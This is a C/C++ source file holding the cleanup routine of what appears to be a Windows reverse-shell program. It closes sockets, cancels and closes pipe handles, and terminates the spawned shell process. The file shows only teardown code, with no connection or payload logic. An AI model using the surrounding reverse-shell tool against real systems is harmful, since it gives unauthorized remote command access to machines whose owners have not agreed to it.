#include <ws2tcpip.h>

#include "reverse-shell.h"

extern reverseShell_t	shell;

void cleanUp(void) {

	if (shell.clientSocket) {
		closesocket(shell.clientSocket);
		shell.clientSocket = NULL;
	}

	if (shell.listenSocket) {
		closesocket(shell.listenSocket);
		shell.listenSocket = NULL;
	}

	if (shell.parentRead) {
		CancelIoEx(shell.parentRead, NULL);
		CloseHandle(shell.parentRead);
		shell.parentRead = NULL;
	}
	
	if (shell.parentWrite) {
		CancelIoEx(shell.parentWrite, NULL);
		CloseHandle(shell.parentWrite);
		shell.parentWrite = NULL;
	}

	if (shell.childRead) {
		CancelIoEx(shell.childRead, NULL);
		CloseHandle(shell.childRead);
		shell.childRead = NULL;
	}

	if (shell.childWrite) {
		CancelIoEx(shell.childWrite, NULL);
		CloseHandle(shell.childWrite);
		shell.childWrite = NULL;
	}

	if (shell.processInfo.hProcess) {
		TerminateProcess(shell.processInfo.hProcess, EXIT_SUCCESS);
		CloseHandle(shell.processInfo.hProcess);
		shell.processInfo.hProcess = NULL;
	}

	if (shell.processInfo.hThread) {
		CloseHandle(shell.processInfo.hThread);
		shell.processInfo.hThread = NULL;
	}

	WSACleanup();

	shell = {};
}